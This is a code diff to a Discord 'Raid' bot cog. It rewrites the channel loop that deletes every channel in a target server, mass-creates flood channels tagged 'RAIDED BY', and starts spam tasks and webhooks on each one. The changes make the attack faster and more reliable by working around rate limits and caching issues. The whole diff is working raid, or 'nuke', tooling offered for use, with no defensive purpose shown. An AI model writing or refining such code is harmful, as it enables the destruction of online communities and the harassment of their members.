@@ -259,55 +259,60 @@ class Raid(commands.Cog):
     #   4. Short pause, then repeat
     # ─────────────────────────────────────────────────────────────────────────
     async def _channel_loop(self, guild: discord.Guild) -> None:
-        se    = bot_state.stop_event
-        q     = HttpQueue.get()
-        cycle = 0
+        se = bot_state.stop_event
+        q  = HttpQueue.get()
 
         try:
-            if not se.is_set():
-                cycle = 1
+            # ── DELETE all existing channels via HTTP queue ────────────────
+            existing = list(guild.channels)
+            print(f"[nuke] queuing {len(existing)} deletes", flush=True)
+            for ch in existing:
+                q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
 
-                # ── DELETE all channels via 100-thread queue ───────────────
-                existing = list(guild.channels)
-                print(f"[nuke] cycle {cycle} — queuing {len(existing)} deletes", flush=True)
-                for ch in existing:
-                    q.put(requests.delete, f"{API_BASE}/channels/{ch.id}")
-                await q.join()
+            # Sleep instead of q.join() — other tasks share the same queue,
+            # q.join() would block until _role_flood/_member_ops also finish.
+            delete_wait = max(5.0, len(existing) * 0.15)
+            await asyncio.sleep(delete_wait)
 
-                if not se.is_set():
-                    # let gateway deliver CHANNEL_DELETE events
-                    await asyncio.sleep(1.5)
+            if se.is_set():
+                return
 
-                    # ── CREATE 100 flood channels via 100-thread queue ─────
-                    print(f"[nuke] cycle {cycle} — queuing {CREATE_PER_CYCLE} creates", flush=True)
-                    for i in range(CREATE_PER_CYCLE):
-                        if se.is_set():
-                            break
-                        q.put(
-                            requests.post,
-                            f"{API_BASE}/guilds/{guild.id}/channels",
-                            {
-                                "name": _ch_name(i),
-                                "type": 0,
-                                "topic": f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
-                            },
+            # extra buffer for gateway CHANNEL_DELETE events
+            await asyncio.sleep(2.0)
+
+            # ── CREATE flood channels via discord.py (populates cache) ─────
+            # This is critical: raw HTTP creates don't update guild.text_channels.
+            # Using discord.py native API means each channel is immediately cached
+            # and we can start spamming it right away.
+            _create_sem = asyncio.Semaphore(2)  # Discord allows ~2 creates/sec
+
+            async def _create_and_spam(i: int) -> None:
+                if se.is_set():
+                    return
+                async with _create_sem:
+                    if se.is_set():
+                        return
+                    try:
+                        ch = await asyncio.wait_for(
+                            guild.create_text_channel(
+                                _ch_name(i),
+                                topic=f"RAIDED BY {RAID_TAG} | {RAID_LINK}",
+                            ),
+                            timeout=15.0,
                         )
+                        if not se.is_set():
+                            bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
+                            for _ in range(WEBHOOKS_PER_CH):
+                                bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
+                    except Exception as e:
+                        print(f"[nuke] create failed: {e}", flush=True)
 
-                    if not se.is_set():
-                        await q.join()
-
-                    # let gateway deliver CHANNEL_CREATE events
-                    await asyncio.sleep(2.0)
-
-                    # ── start spam tasks on every fresh channel ────────────
-                    for ch in list(guild.text_channels):
-                        if se.is_set():
-                            break
-                        bot_state.add_task(asyncio.create_task(self._spam_channel(ch)))
-                        for _ in range(WEBHOOKS_PER_CH):
-                            bot_state.add_task(asyncio.create_task(self._add_webhook(ch)))
-
-                    print(f"[nuke] cycle {cycle} — spam launched on {len(guild.text_channels)} channels", flush=True)
+            print(f"[nuke] creating {CREATE_PER_CYCLE} flood channels", flush=True)
+            await asyncio.gather(
+                *[_create_and_spam(i) for i in range(CREATE_PER_CYCLE)],
+                return_exceptions=True,
+            )
+            print(f"[nuke] channel flood + spam launched", flush=True)
 
         except asyncio.CancelledError:
             q.clear()
